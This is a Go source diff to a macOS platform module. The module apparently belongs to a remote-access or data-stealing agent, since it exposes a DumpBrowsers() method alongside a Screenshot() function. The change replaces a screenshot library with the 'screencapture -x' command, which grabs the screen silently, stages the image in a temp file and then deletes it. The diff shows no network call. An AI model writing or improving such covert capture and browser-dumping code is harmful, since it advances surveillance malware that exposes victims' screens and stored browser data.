@@ -3,12 +3,9 @@
 package darwin
 
 import (
-	"bytes"
 	"fmt"
-	"image/png"
+	"os"
 	"os/exec"
-
-	"github.com/kbinani/screenshot"
 )
 
 // DarwinPlatform represents the macOS platform.
@@ -45,22 +42,24 @@ func (p *DarwinPlatform) DumpBrowsers() string {
 
 // Screenshot captures the screen.
 func (p *DarwinPlatform) Screenshot() ([]byte, error) {
-	n := screenshot.NumActiveDisplays()
-	if n <= 0 {
-		return nil, fmt.Errorf("no active displays found")
-	}
-
-	bounds := screenshot.GetDisplayBounds(0)
-	img, err := screenshot.CaptureRect(bounds)
+	// Create a temporary file to store the screenshot
+	tmpfile, err := os.CreateTemp("", "screenshot-*.png")
 	if err != nil {
-		return nil, fmt.Errorf("error capturing screen: %v", err)
+		return nil, fmt.Errorf("failed to create temp file for screenshot: %w", err)
+	}
+	defer os.Remove(tmpfile.Name()) // Ensure the temporary file is deleted
+
+	// Use the 'screencapture' command-line utility without interactive mode
+	cmd := exec.Command("screencapture", "-x", tmpfile.Name())
+	if err := cmd.Run(); err != nil {
+		return nil, fmt.Errorf("failed to run screencapture command: %w", err)
 	}
 
-	var buf bytes.Buffer
-	err = png.Encode(&buf, img)
+	// Read the screenshot data from the temporary file
+	data, err := os.ReadFile(tmpfile.Name())
 	if err != nil {
-		return nil, fmt.Errorf("error encoding screenshot: %v", err)
+		return nil, fmt.Errorf("failed to read screenshot file: %w", err)
 	}
 
-	return buf.Bytes(), nil
+	return data, nil
 }
